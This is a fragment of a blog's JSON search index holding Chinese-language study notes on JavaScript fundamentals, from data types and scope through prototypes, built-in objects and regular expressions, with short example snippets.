https://superuser.com/questions/738612/openssl-ca-keyusage-extension/)","categories":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/categories/vpn/"}],"tags":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/tags/vpn/"}]},{"title":"JS笔记","slug":"JS笔记","date":"2022-01-17T11:45:34.000Z","updated":"2022-01-17T11:45:34.000Z","comments":true,"path":"2022/01/17/JS笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/01/17/JS%E7%AC%94%E8%AE%B0/","excerpt":"","text":"Chrome内运行 开发者工具-&gt;Console 窗口调试 JavaScript 代码 开发者工具-&gt;Sources-&gt;Snippets选项卡-&gt; Creat new snippet 来新建一个脚本文件 JS没有任何打印或者输出的函数，只能：使用 window.alert() 弹出警告框；document.write() 方法将内容写到 HTML 文档中；innerHTML 写入到 HTML 元素； console.log() 写入到浏览器的控制台。 使用 document.getElementById(id) 方法：使用 “id” 属性来标识&#x2F;查找 HTML 元素，并 innerHTML 来获取或插入元素内容。使用方法如下，先id1234567891011下面是几个例子：```javascriptconsole.time(&quot;计时器的名字&quot;);console.timeEnd(&quot;计时器的名字&quot;); console.log();document.write(); // 实际上是通过超文本标记语言(html)输出。比如想换行，document.write(1+&quot;\\n&quot;)不行，document.write(1+&quot;&lt;br /&gt;&quot;)才行。var year = prompt(&quot;请输入年份&quot;); //prompt()：弹出一个带文本框的提示框,需要字符串做参数做为提示文字。注意返回类型为String。Math.sqrt(i); //开方 数据类型基本数据类型：String Number Boolean Null Undefined引用数据类型：Object 主要区别：基本数据类型在栈中保存的是值，引用数据类型在栈中保存的是地址。 使用typeof a查看a的数据类型。转义字符：\\。\\n :换行 \\t:制表符 \\\\:斜杠“\\”。 在字符串中使用转义字符输出Unicode编码：\\u四位编码，如console.log(&quot;\\u2620&quot;)。注意这里的四位编码是16进制。在网页中使用Unicode编码：&amp;#十进制编码，如&lt;p&gt;&amp;#9760;&lt;/p&gt;。 String：双引号和单引号都行，但不要混用；可以使用\\作为转义字符 引号需要成对出现，不能嵌套！ Number：包括整数和浮点数。 NaN：特殊的数字，表示Not a Number Number.MAX_VALUE：最大数。比它大就是Infinity，都是字面量。 Number.MIN_VALUE：最小正数。 运算：整数基本保证精确。浮点元素运算可能不精确。 千万别用JS进行对精确度要求高的运算！ Boolean Null：专门表示一个为空的对象。使用typeof检查时返回object。 Undefined：声明了但没赋值的变量。使用typeof检查时返回undefined。 强制类型转换类型转换主要指将其他数据类型转换为String Number Boolean。 转换为String： 调用被转换数据类型的toString()方法：a = a.toString()。null和undefined没有toString()方法。 调用String()函数：a = String(a)。 toString()方法和String()函数都不会影响原变量，返回的只是转换结果。 转换为Number： Number()函数：a = Number(a)。字符串类型有非数字的转为NaN，空串或者全是空格转为0。Undefined类型、object类型结果为NaN。Null类型结果为0。 局限：对于a = 123px，想要进行a + 10这类情景不友好。 一种专门解决字符串的方法函数parseInt()：将一个字符串中的 有效 整数拿出。可以用来取整。函数parseFloat()：将一个字符串中的 有效 小数拿出。如果是非String，会转换成string再处理。 可以在parseInt()中传递第二个参数指定进制：parseInt(a,10) 转换为Boolean：Boolean()函数 数字：除了0和NaN都是true；字符串：除了空串都是true；null和undefined都是false 总之，除了0、-0、NaN、‘’、null和Undefined都为true。 可以对任意数据类型取反两次转换为Boolean:a = !!a。!!是一种强制类型转换，作用为把变量转换成“等价”的布尔值。 引用数据类型 栈内存和堆内存 栈内存：JS中的变量都保存到栈内存，基本数据类型的值直接在栈内存中存储。值与值之间独立存在，修改一个变量不会影响其他变量。 堆内存：JS中的对象都保存到堆内存，每创建一个新的对象就会在堆内存中创建一个新的空间。这种情况下变量保存的是对象的内存地址（对象的引用）。如果两个变量保存的是同一个对象引用，则当一个通过一个变量修改属性时，另一个也会受到影响。如果直接修改变量的值，比如obj2 = null，那么obj不受影响。 当比较两个基本数据类型的值时，就是比较值；但两个引用数据类型比较的是对象的内存地址。 作用域全局作用域全局作用域在页面打开时创建，在页面关闭时销毁。直接编写在script标签中的JS代码都在全局作用域。全局作用域中有一个全局对象window，它由浏览器创建，代表浏览器窗口，我们可以直接使用。全局作用域中创建的变量都会作为window对象的属性保存，创建的函数都会作为window对象的方法保存。全局作用域中的变量都是全局变量，在页面的任意部分都可以访问到。 函数作用域调用函数时创建函数作用域，函数执行完毕以后函数作用域销毁。每调用一次函数就会创建一个新的函数作用域，他们之间互相独立。当在函数作用域操作变量时，会优先在自身作用域中寻找，如果有就直接使用。如果自身作用域没有，按照就近原则使用上级作用域中的同名变量。如果全局作用域中依然没有就会报错。要在函数中精确访问全局变量可以使用window对象。 定义形参就相当于在函数作用域中声明了变量。函数中定义形参a就相当于var一个a。 在函数中，不使用var声明的变量都会成为全局变量！前提是这个函数先被调用了。 变量和函数的声明提前（提升）变量的声明提前：使用var关键字声明的变量，会在所有代码执行之前被声明（但不会赋值，使用的时候再复制），也就是预编译先找到var a，让变量a=undefined。但如果声明变量不是用的var关键字，则变量就不会被声明提前。 函数的声明提前：使用函数声明形式创建的函数function 函数()&#123;&#125;会在所有的代码执行之前就被创建，所以我们可以在函数声明前就调用函数。这样的函数声明写在哪里都一样。但使用函数表达式创建的函数var 函数名 = function()&#123;&#125;不会被声明提前，所以不能在声明前调用。因为根据变量的声明提前原理，由于使用了var关键字，所以函数名被赋值为undefined，只有在使用时才会被赋予具体值。 在函数作用域中也有声明提前的特性，使用var关键字声明的变量会在函数中所有代码执行之前被声明。使用函数声明形式创建的函数也会在函数中所有的代码执行之前执行。 this解释器在调用函数每次都会向函数内部传递一个隐含参数，这个隐含的参数就是this。this指向的是一个对象，该对象称为函数执行的上下文对象。根据函数 调用方式 的不同，this会指向不同的对象： 以函数形式调用时，this永远都是window 以方法形式调用时，this就是调用方法的对象 以构造函数形式调用时，this就是新创建的对象 在事件的响应函数中，响应函数是给谁绑定的this就是谁 总之就是this指向当前调用函数的对象。 运算任何数和NaN运算的结果都是NaN。除拼串，对任何非Number的值会转换成Number。 算术运算 +：对几个字符串使用是拼串操作。var a = &quot;123&quot;+&quot;456&quot;，结果为123456。事实上，任何值和字符串相加都会转换成字符串并进行拼串操作。 隐式类型转换：可以利用这一特点将一个任意数据类型转换为String，只需要任意的数据类型 + 一个””即可：a = a + &#39;&#39;。 - * &#x2F;：除了“ + ”的其他运算符号（- * &#x2F;），在算式中出现的变量都会转化成数字再计算。 隐式类型转换：可以利用这一特点将一个任意数据类型转换为Number，只需要任意的数据类型 -0;*1;/1即可。原理和Number()一样，使用更简单。 一元运算符：全换为Number类型再运算。+ -, 正号” + “不会对数字产生任何影响, 负号“-”可以对数字进行符号取反。 隐式类型转换：可以利用这一特点将一个任意数据类型转换为Number，只需要任意的数据类型 a = +a即可。如a = 1 + +a + 2。 逻辑运算JS中的&amp;&amp; 和 || 是短路与&#x2F;或而不是逻辑与&#x2F;或。对于非布尔值：会先将其转换为布尔值再运算，并且 返回原值 。 &amp;&amp;：两值运算，若第一个为true，返回第二个值；第一个为false，直接返回第一个值。 ||：两值运算，若第一个为true，直接返回第一个值；第一个为false，返回第二个值。 == 和 !=：（不）相等运算。若两个值类型不同，会转化成相同类型再比较，大部分情况是转化为数字。 Undefined衍生自null，所以这两个值作相等判断时会返回true NaN不和包括它本身任何值相等。可以通过isNaN()函数判断一个值是否为NaN。 === 和 !==：（不）全等运算。和相等的区别在于它不会做类型转换。若类型不同直接返回。 关系运算指&gt; &gt;= &lt; &lt;= =。会转化成数字再比较。任何值和NaN比较都是false。 若比较符号的两侧都是字符串，不会转换为数字，而会分别比较字符串中的 Unicode编码，一位一位比较，两位一样就比下一位。如果比较两个字符类型的数字时，可能得到不可预期的结果。所以比较两个字符串类型的数字时，一定要转型。可以利用该特性对英文排序。 条件运算语法：条件表达式？语句1:语句2。先执行条件运算符，判断执行语句1还是2，并返回执行结果。若条件表达式的结果是非布尔值，会将其转化为布尔值再运算。 函数和代码块调用函数时 解释器不会检查实参的类型 ，实参可以是任意数据类型。所以要注意如果有可能接收到非法的参数就需要对参数进行类型检查。同样， 解释器不会检查实参的数量 ，多余实参不会被赋值，如果实参数量少，则没有对应实参的形参将是undefined。 普通函数和箭头函数两种写法分别为data:function()&#123;&#125;和 data:()=&gt;&#123;&#125;。一般在对象里写方式会删掉function，删掉冒号：data()&#123;&#125;区别：箭头函数没有自己的this，只会向外找，找到的是window。 函数中的return在函数中，return后可以跟任意类型的值。return后的语句都不会执行；如果return语句后不跟任何值或者函数中不写return就相当于返回一个undefined。 注意my fun()和fun的区别： fun()```：是调用函数，相当于使用了函数 **返回值**123456789101112131415&gt;```myfun```：是函数对象，相当于直接使用了函数 **对象** ### 函数声明、立即执行函数和代码块使用**函数声明**或**函数表达式**来创建函数：```javascript// 函数声明function 函数名(形参1,形参2,...,形参n)&#123; 语句...&#125;// 函数表达式：创建一个匿名函数,再将这个匿名函数对象赋值给一个变量// 此时，语句本质上是一个赋值语句，因此最好在末尾加分号。var 函数名 = function(形参1,形参2,...,形参n)&#123; 语句...&#125;; 使用 立即执行函数 使函数定义完立即被调用。立即执行函数往往只会执行一次。 12345(function(a,b)&#123; // 如果外围不加括号，解释器会将大括号中的内容识别为一个代码块而无视前面的声明 console.log(&quot;a=&quot; + a); console.log(&quot;b=&quot; + b);&#125;)(123,456) 一个&#123;&#125;中的内容称为一个代码块，一个代码块中的内容要么都执行，要么都不执行。 JS中的代码块 只有分组作用！块中的内容块外也完全可见，并不隔离。 条件判断&#x2F;条件分支&#x2F;switch&#x2F;for语句12345678910111213141516171819202122// if语句if(条件表达式)&#123; 语句... &#125;else if&#123; 语句... &#125;else&#123; 语句... &#125;// switch语句。依次将case后的表达式和switch后的条件表达式进行全等比较。switch(条件表达式)&#123; case 表达式； 语句... break; default: 语句... break;&#125;// while。判断一次执行一次。可以使用break终止循环。while(条件表达式)&#123; 语句... &#125;// do...while。执行一次判断一次。也就是while先判断再执行，do...while先执行再判断。do...while可以保证循环体至少执行一次。do&#123; 语句... &#125;while(条件表达式)// for语句。for(初始化表达式；条件表达式；更新表达式)&#123; &#125; break和continue（和return）可以为循环语句加上一个label标识当前循环。比如创建一个label为outer的循环：outer:循环语句 break outer：结束循环。立即终止label&#x3D;outer的循环。默认终止本 层 循环。 只能对循环和switch语句使用! continue outer：跳过当 次 循环，继续下一次循环。其它和break一样。 return：结束整个函数。 函数的方法：call()和apply()——修改函数对象的this这两个方法都是函数对象的方法，需要通过函数对象（不加()）来调用。当对函数调用call()和apply()时都会使函数执行。在调用call()和apply()时，可以将一个对象指定为第一个参数，此时这个对象将会成为函数执行时的this。 call()方法可以将实参在对象后依次传递：fun.call(obj,3,4) // a=3，b=4apply()方法需要将实参封装到一个数组中统一传递：fun.apply(obj,[3,4]) // a=3，b=4 arguments在调用函数时，浏览器每次都会传递进两个隐含的参数：函数的上下文对象this和封装 实参 的对象arguments。arguments是一个类数组对象，它也可以通过索引来操作数据，也可以获取长度。在调用函数时我们传递的实参都会在arguments中保存，arguments.length可以用来获取实参的长度。即使不定义形参也可以通过arguments来使用实参，只不过比较麻烦；arguments[0]表示第一个实参，以此类推。 不管定不定义形参，实参都会在arguments中保存！ 123456function fun()&#123; console.log(arguments); // [object arguments] // 是类数组对象，不是数组对象 console.log(arguments instanceof Array); // false console.log(Array.isArray(arguments)); // false&#125; 另外，arguments里面还有一个属性叫callee，这个属性对应一个函数对象，就是当前正在指向的函数对象。 数组也是对象，不同的是普通对象使用字符串作为属性名，数组使用数字作为索引操作元素。数组的存储性能比普通对象好，在开发中经常使用数组来存储一些数据。 123456789101112131415// 可以在创建时就指定数组中的元素。使用```typeof```检查数组时返回object。// 创建数组对象————使用构造函数和使用字面量创建数组：var arr = new Array(1,20,30); // 只传一个正整数时创建的是长度为指定值的空数组。var arr1 = [1，2，3，10]; // 常用// 向数组中添加元素。语法：数组[索引] = 值// 读取数组中的元素：数组[索引]。如果读取不存在的索引返回undefined。arr[0]=10;// 获取数组长度。对于连续数组返回元素个数，非连续数组返回最大索引 + 1。console.log(arr.length);// 修改length。修改的length大于原长，多出的部分会空出来；小于时多出的元素会被删除。arr.length = 5;// 技巧：向数组的最后添加元素arr[arr.length] = 66; 数组的遍历通常都是用for循环。 JS还提供了一个方法：forEach()。需要注意该方法只支持IE8以上的浏览器。forEach()方法需要一个函数作为参数，通常不会为了它去专门创建一个全局变量，而是使用匿名函数（像这种函数，由我们创建但不是由我们调用的，称为回调函数。）。 数组中有几个元素就会执行几次，每次执行时浏览器会将遍历到的元素以实参的形式传递进来，我们可以定义形参来读取这些内容。浏览器会在回调函数中传递三个参数：第一个是当前正在遍历的元素，第二个是当前正在遍历的元素的索引，第三个是当前正在遍历的数组。 1arr.forEach(function(value,index,obj)&#123; &#125;) 增减开头&#x2F;末尾元素：push()和pop() unshift()和shift()push()方法向数组的末尾添加一个或多个元素，可以将要添加的元素作为方法的参数传递，这样这些元素将会自动添加到数组的末尾。同时将新数组的长度作为返回值返回。pop()方法删除数组的最后一个元素，同时将被删除的元素作为返回值返回。 unshift()方法向数组开头添加一个或多个元素，同时将新数组的长度作为返回值返回。向前面插入元素后，其他元素的索引会依次调整。shift()方法删除数组的第一个元素，同时将被删除的元素作为返回值返回。 提取元素：slice() splice()slice()方法用来从数组中提取指定元素。该方法不会改变原数组，而是将截取到的元素封装到一个新数组中返回。参数：1.截取开始的位置的索引；2.截取结束的位置的索引（左闭右开）。索引可以传递一个负值，表示从后往前计算（-1是倒数第一个，-2倒数第二个）。第二个参数可以省略不写，此时会截取从开始索引往后的所有元素。 splice()用来从数组中删除（并替换&#x2F;插入）指定元素。该方法会改变原数组：将指定元素从原数组中删除，并将被删除的元素作为返回值返回。参数：1.截取开始的位置的索引（包含）；2.删除的数量；3.第三个及以后的参数可以传递新元素，将它们按顺序插入到开始位置索引的前面。 连接数组：concat()concat()方法用来连接两个或多个数组，该方法不会影响原数组，并将新数组返回。 转换为字符串：join()join()方法用来将数组转换为一个字符串，该方法不会影响原数组，并将转换后的字符串作为结果返回。可以指定一个字符串作为参数，这个字符串将会成为数组中元素的连接符。如果不指定则默认使用逗号作为连接符。 反转数组：reverse()reverse()方法用来反转数组，该方法会直接修改原数组。 排序：sort()sort()方法用来对数组中的元素进行排序，该方法会直接修改原数组。默认按照Unicode编码进行排序。即使对纯数字数组，sort()方法也会按照Unicode编码进行排序。所以对数字排序时可能会得到错误结果。 浏览器不同可能导致结果相反 可以在sort()中添加一个回调函数指定排序规则。回调函数需要定义两个形参，浏览器将会分别使用数组中的元素作为实参去调用回调函数，使用哪个元素调用不确定，但肯定的是在数组中a一定在b前面，浏览器会根据回调函数的返回值决定元素的顺序，如果返回一个大于0的值，则元素会交换位置；返回一个小于或等于零的值，元素位置不变。如果需要升序排列，返回a-b；如果需要降序排列，返回b-a。 1arr.sort(function(a,b)&#123; return a-b;&#125;) // 升序排列 对象 内建对象：由ES标准中定义的对象。在任何ES的实现中均可使用。如Math String Number Boolean Function Object 宿主对象：由JS的运行环境提供的对象。主要指由浏览器创造的对象。如BOM（浏览器对象模型） DOM（文档对象模型）。console、document也属于这一类。 自建对象：由开发人员自己创建。 属性名和属性值是名值对。名与值之间使用 : 连接，多个名值对之间使用 , 隔开。对象中的最后一个属性之后不要写 ‘, ’。读取对象中的属性值可以使用对象.属性名的方式。 读取对象中没有的属性，不会报错而是会返回undefined。如果使用了特殊的属性名，需要用对象[&quot;属性名&quot;] = 属性值的方式操作。中括号[ ]的特点就是可以传递一个变量。 使用[ ]操作对象更加灵活。在[ ]中可以直接传递一个变量，这样变量值是多少，就会读取变量值那个属性： 比如var n = &quot;hi&quot;; obj[n]=&quot;你好&quot;; console.log(obj[n]);就会输出“你好”。 删除属性：delete 对象.属性名。 使用in检查对象中是否含有某个属性时，如果对象中没有但原型中有，也会返回true。 可以使用对象的hasOwnProperty()方法检查对象自身中是否含有该属性，只有当对象自身含有属性时才会返回true。 方法如果一个函数作为对象的属性保存，我们称这个函数为对象的方法。 使用for ... in语句枚举对象中的属性。对象中有几个属性循环体就执行几次。每次执行时，会将对象中的一个属性的 名字 赋值给变量。语法：for(变量 in 对象)&#123;&#125;。 1234for(var n in obj)&#123; console.log(“属性名” + n); // 属性名：name 属性名：age console.log(“属性值” + obj[n]); // 属性值：Bob 属性值：18&#125; 使用工厂方法创建对象：可以大批量地创建对象，尤其是具有相同属性名、不同属性值的。1234567891011121314function createPerson(name,age,gender)&#123; // 创建一个新的对象 var obj = new Object(); // 向对象中添加属性 obj.name = name; obj.age = age; obj.gender = gender; obj.sayName = function()&#123; alert(this.name); &#125;; // 将新的对象返回 return obj;&#125;var obj2 = createPerson(&quot;张三&quot;，18，“男”)； 构造函数使用工厂方法创造的对象使用的构造函数都是Object，所以创建的对象都是Object这个类型，导致无法区分多种不同类型的对象。 构造函数就是一个普通函数，创建方式和普通函数一样，不同的是构造函数习惯首字母大写。构造函数和普通函数的区别：调用方式不同。普通函数是直接调用，而构造函数需要使用new关键字调用。 使用同一个构造函数创建对象称为一类对象，也将一个构造函数称为一个类。将通过同一个构造函数创建的对象称为该类的实例。使用instanceof可以检查一个对象是否是一个类的实例，语法：对象 instanceof 构造函数。如果是，返回true，否则返回false。 所有对象都是Object的后代，因此任何对象和Object做instanceof检查时都会返回true。 12345678910function Person(name,age)&#123; this.name = name; this.age = age; this.sayName = function()&#123; alert(this.name); &#125;&#125;var per = new Person(&quot;Bob&quot;,18);per.sayName();console.log(per.sayName); 构造函数的执行流程： 立刻 创建一个新的函数对象。一出现new，就会在堆内存开辟出一个新的内存空间。这片空间保存Person()函数中的内容。 将新建的对象设置为构造函数中的this。在构造函数中可以使用this来引用新建的对象。也就是新开辟出的堆内存空间的地址赋值给变量per，this保存着per的地址，指向per这块对象内存。(this 是保存在栈中的, 执行构造函数的时候, this也保存了那片区域的地址) 逐行执行函数中的代码。（只有这一步是我们写的，其他都是浏览器干的） 将新建的对象作为返回值返回。 垃圾回收（Garbage Collection，GC）当一个对象没有任何的变量或属性对它进行引用，将永远无法操作该对象，这种对象就是垃圾，存在过多会占用大量的内存空间，必须进行清理。 JS中有自动的垃圾回收机制，会自动将这些垃圾对象从内存中销毁，我们不需要也不能进行垃圾回收的操作。我们需要做的只是要将不再使用的对象设置为null。 原型对象在上面的Person()构造函数中为每一个对象都添加了一个sayName方法，而且这个方法是在构造函数内部创建的，也就是构造函数每执行一次就会创建一个新的sayName方法，（说到底每次执行构造函数在堆空间中开辟的内存都不同），也就是所有实例的sayName都是唯一的。如果像这样将sayName方法在全局作用域中定义（这里叫它fun）：function fun()&#123;alert(this.name);&#125;，则会污染全局作用域的命名空间，而且定义在全局作用域中也很不安全。 显式原型prototype和隐式原型__proto__显式原型（函数）：我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype（例外：通过Function.prototype.bind方法构造出来的函数没有prototype属性）。这个属性指向函数的原型对象。其主要作用是实现基于原型的继承与属性的共享。隐式原型（实例）：可以通过__proto__（两边都是两个下划线）访问对象的内置属性prototype。其主要作用是构成原型链，同样用于实现基于原型的继承。比如访问obj对象中的x属性时，如果在obj中找不到就会沿着__proto__依次查找。__proto__指向创建这个对象的函数的显式原型。 显式原型prototype和隐式原型__proto__的区别在于，prototype是构造函数的属性，而__proto__是对象的属性。无论是函数身上的显式原型属性，还是实例身上的隐式原型属性，它们都指向了同一个对象：原型对象。通过显式原型链给原型(或者原型的原型)添加属性，通过隐式原型链获取原型的属性，从自身沿着原型链一直找直到window的原型为空。 实例的隐式原型属性，永远指向自己缔造者的原型对象！ 如果函数作为普通函数调用，prototype没有任何作用；当函数以构造函数的形式调用时，它所创建的对象中都有一个隐含的属性指向该构造函数的原型对象。也就是构造函数.prototype == 所有该构造函数的实例._proto_。 原型对象就相当于一个公共的区域，所有一个类的实例都可以访问到这个原型对象。我们可以将对象中共有的内容统一设置到原型对象中。当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果没有则会去原型对象中寻找，找到了就直接使用。 以后我们创建构造函数时可以将这些对象共有的属性和方法统一添加到构造函数的原型对象中，这样不用为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法了。 123456789// 向Person的原型中添加属性aPerson.prototype.a = 123;// 向Person的原型中添加一个方法Person.prototype.sayName = function()&#123; alert(this.name);&#125;var per = new Person(&quot;Bob&quot;,18)per.sayName(); 原型对象的原型原型对象也是对象，所以它也有原型。当我们使用一个对象的属性或方法时，会先在自身中寻找，自身中如果有，则直接使用；如果没有则去原型对象中寻找，如果原型对象中有，则使用；如果没有则去原型的原型中寻找。直到找到Object对象的原型————虽然Object对象的原型没有原型，但它也有一个__proto__属性，这个属性对应的值就是null。如果在Object中依然没有找到，则该对象.属性返回undefined。（null是没找到原型，undefined是没找到原型的属性） 在看原型链时，只要看到toString()方法，就证明这个已经到了Object的原型对象。 123456789// 原型。实例._proto_=构造函数.prototype，即Person的prototypeconsole.log(per.__proto__);// 原型的原型。Person.prototype的_proto_，是Object的prototypeconsole.log(per.__proto__.__proto__); //[Object Object]console.log(per.__proto__.__proto__.hasOwnProperty(&quot;hasOwnProperty&quot;)); //true// 原型的原型的原型。Object的原型没有原型。console.log(per.__proto__.__proto__.__proto__); // null toString()当我们直接在页面中打印一个对象时（console.log)，实际上是输出的对象的toString()方法的返回值。如果我们希望在输出对象时不输出[Object Object]，可以为对象（或原型）添加一个toString()方法。 把prototype写在构造方法前面才能覆盖toString()方法！ 123456789// 它们的输出都是[Object Object]（除了Chrome）console.log(per);console.log(per.toString());// 修改per对象原型的toStringPerson.prototype.toString = function()&#123; return &quot;Person[name=&quot; + this.name + &quot;,age=&quot; + this.gender + &quot;]&quot;;&#125;console.log(per); // 现在的输出是&quot;Person[name=Bob,age=18]&quot; Date对象使用var d = new Date()创建Date对象。如果直接使用构造函数创建一个Date对象，则会封装为当前代码执行的时间使用var d2 = new Date(月/日/年 时：分：秒)创建指定时间的Date对象。需要在构造函数中传递一个表示时间的字符串作为参数。 getdate()，getday()，getmonth()，getFullyear()使用getdate()获取当前日期对象的日是多少，getFullyear()同理。getday()获取当前日期对象是周几。getmonth()获取当前日期对象的月份，返回一个0-11的值，0表示一月。 时间戳：getTime()和Date.now()使用getTime()获取当前日期对象的时间戳，即从格林威治标准时间的1970年1月1日0时0分0秒到当前日期所花费的毫秒数。 时区不同，计算结果也不同。在CN，1970年1月1日0时0分0秒的时间戳并不为0。计算机底层在保存时间时使用的都是时间戳。 使用Date.now()获取当前时间的时间戳。 Math对象Math和其他的对象不同，它不是一个构造函数！它属于工具类，不用创建对象，它里面封装了数学运算相关的属性和方法。 123456789Math.ceil() // 向上取整Math.floor() // 向下取整Math.round() // 四舍五入取整Math.random() // 生成[0，1)的随机数，可以乘x生成[0，x)的随机数Math.round(Math.random()*(y-x)+x) // 生成[x，y )的随机数Math.pow(x,y) // 返回x的y次幂Math.sqrt() // 返回平方根 包装类JS中提供了三个包装类，可以将基本数据类型的数据转换为对象。 String()：可以将基本数据类型的字符串转换为String对象 Number()：可以将基本数据类型的字符串转换为Number对象 Boolean()：可以将基本数据类型的字符串转换为Boolean对象 但是注意，实际应用中不会使用基本数据类型的对象（如var num = new Number(3)），因为使用它们可能在比较时带来不可预期的结果。 方法和属性只能添加给对象，不能添加给基本数据类型。但var s = 10;s = s.toString();s.hello = &quot;11&quot;不会报错，原因在于当我们对一些基本数据类型的值去调用属性和方法时，浏览器会临时使用包装类将其转换为对象，再调用对象的属性和方法。调用完后还是基本数据类型。 String对象的相关方法字符串在底层是以字符数组的形式保存的。比如它也有length属性，可以用来获取字符串的长度。 除非特殊说明，字符串的大部分方法都不会改变原字符串。 charAt()：根据索引返回字符串中指定位置的字符。作用同中括号[ ]。 charCodeAt()：获取指定位置字符的Unicode编码。 formCharCodeAt()：根据字符编码去获取字符。需要用构造函数去调用：String.formCharCodeAt()。 concat()：连接两个或多个字符串，作用同加号。 indexOf()：检索一个字符串中是否含有指定内容。如果含有该内容，会将其第一次出现的索引作为返回值返回。如果没找到则返回-1。可以指定第二个参数指定开始查找的位置。 lastIndexOf()：用法同上，不同的是上一个从前往后，这个从后往前找。返回最后出现的下标。也可以指定开始查找的位置。 slice()：从字符串截取指定内容并将截取到的内容返回。第一个参数是开始位置的索引，第二个是结束位置的索引，左闭右开。省略第二个参数就会截取后面所有的。传递负数将会从后边计算，-1是倒数第一个，以此类推。 subString()：和slice()完全一样，不同的是这个方法不能接受负值作为参数，如果传了负值自动按0处理，而且他还自动调整参数的位置，如果第二个参数小于第一个就自动交换。 split()：将字符串拆分为数组。需要一个字符串作为参数，将会根据该字符串去拆分数组。如果传递空串作为参数，则会将每个字符都拆分为数组中的一个元素。 正则表达式 一些处理常见任务的正则表达式可以直接去网上搜索。 正则表达式（reg，Regular Expression，又称规则表达式）用于定义一些字符串的规则，计算机可以根据正则表达式检查一个字符串是否符合规则，将字符串中符合规则的内容提取出来。通过var 变量 = new RegExp(&quot;正则表达式&quot;，&quot;匹配模式&quot;);创建正则表达式的对象。还可以使用字面量创建正则表达式var 变量 = /正则表达式/匹配模式。使用字面量方式创建更加简单，使用构造函数创建更加灵活。使用typeof检查正则对象返回object。使用test()方法检查一个字符串是否符合正则表达式的规则，如果符合返回true。 使用竖线|表示或者的意思，中括号[]里的内容也是或的意思，[ab]&#x3D;&#x3D;a|b。[a-z]表示任意小写字母，大写字母同理。[A-z]表示任意字母（严格来说ASCII标里A-z中间有六个其他字符）。可以使用/a[bde]c/检查一个字符串中是否含有abc或adc或aec。[^ ]表示除了，只要有除了中括号内符号的其他符号就是true。 在正则表达式中使用\\作为转义字符，用\\.表示.，用\\\\表示\\。正则表达式中的.，\\等特殊字符需要在前面加上\\进行转义。 注意使用构造函数时，由于它的参数是一个字符串，而\\是字符串中的转义字符，如果要使用\\也需要使用\\\\代替。 还有一些带转义字符的元字符。1.\\w：任意字母数字下划线，相当于[A-z0-9_]。\\W：和\\w相反，表示[^A-z0-9_]。（word）2.\\d：任意数字。\\D：除了数字。（digital）3.\\s：空格。\\S：除了空格。（space）4.\\b：单词边界。B同理。（bound）比如检查一个字符串中是否含单词child可以使用reg = /\\bchild\\b/。 其实\\b的作用不只是检查空格，实际上是检查以“半角英数字+下划线”构成的词汇前后存在“非词汇构成元素”（即\\W）的情况，比如“hello%child#”，“hello【child】”这些都能排查出来。 在构造函数中可以传递一个匹配模式作为第二个参数。i：忽略大小写；g：全局匹配模式。可以为一个正则表达式设置多个匹配模式，顺序无所谓。 1234var reg = new RegExp(&quot;a&quot;，&quot;i&quot;); // 检查一个字符串中是否含a/Avar reg = /a/i; // 和上面一行效果相同var str = &quot;a&quot;;console.log(reg.test(&quot;a&quot;)); 正则相关的字符串方法使用split()：将字符串拆分为数组。需要一个字符串作为参数，将会根据该字符串去拆分数组。如果传递空串作为参数，则会将每个字符都拆分为数组中的一个元素。可以传递一个正则表达式作为参数，这样方法将会根据正则表达式去拆分字符串。该方法即使不指定全局匹配也会全部拆分。 使用search()：搜索字符串中是否含有指定内容。如果搜索到指定内容，返回第一次出现的索引；如果没有搜索到就返回-1。可以接受一个正则表达式为参数，根据正则表达式去检索字符串。str = [hello abc afc]; result = str.search(/a[bef]c/)。该方法即使指定全局匹配也只查找第一个。 使用match()：根据正则表达式从一个字符串中将符合条件的内容提取出来。默认情况下match只会找到第一个符合要求的内容，找到以后就停止检索。可以设置正则表达式为全局匹配模式，这样就会匹配到所有的内容。match会将匹配到的内容封装到一个数组中返回，即使只查询到一个结果。 使用replace()：将字符串中的指定内容替换为新的内容。第一个参数：被替换的内容，可以接受一个正则表达式作为参数；第二个参数：新的内容。默认只会替换第一个，指定匹配模式含g可以实现全部替换。第二个参数指定为空串则会删除指定内容。 利用replace()方法去除字符串 he llo 的空格去掉开头的空格：str = str.replace(/^\\s*/,&quot;&quot;);去掉结尾的空格：str = str.replace(/\\s*$/,&quot;&quot;);去掉开头和结尾的空格：str = str.replace(/^\\s*｜\\s*$/g,&quot;&quot;);。其中的两个星号换成加号也可。 量词使用量词设置一个内容出现的次数。需要注意的是量词只对它前边的一个内容起作用，通过括号指定需要重复的组合。{n}，如&#123;(ab)n&#125;，ab正好出现n次。{m,n}，如&#123;ab&#123;m,n&#125;c&#125;，b出现m到n次。{m,}，出现m次以上。+，至少一个。相当于{1,}。*，0个或多个，相当于{0,}。？，0个或一个，相当于{0,1}。^，表示开头。如&#123;^a&#125;，以a开头。$，表示结尾。如&#123;a$&#125;，以a结尾。如果在正则表达式中同时使用^和$则要求字符串必须完全满足正则表达式。 比如创建一个用来检查字符串是否为合法手机号的正则表达式。规则：以1开头+第二位为3-9的任意数字+含第三位的九个任意数字。^1[3-9][0-9]&#123;9&#125;$ 邮件的正则例如&#x68;&#x65;&#x6c;&#108;&#x6f;&#x2e;&#110;&#x69;&#x68;&#x61;&#x6f;&#x40;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;&#x2e;&#99;&#110; 注意量词的使用！ 规则：任意字母数字下划线(3位以上) .任意字母下划线(可选) @ 任意字母数字 .任意字母（2-5位） .任意字母（2-5位）。分别对应：/\\w&#123;3,&#125;/ /(\\.\\w+)*/ /@/ /[A-z0-9]/+ /\\.[A-z]&#123;2,5&#125;/ /\\.[A-z]&#123;2,5&#125;/组合起来：/\\w&#123;3,&#125;(\\.\\w+)*@[A-z0-9]+(\\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;/。但这样写存在问题，还需要加开始和结束符号做严格的限制：/^\\w&#123;3,&#125;(\\.\\w+)*@[A-z0-9]+(\\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;$/。 DOMDocument Object 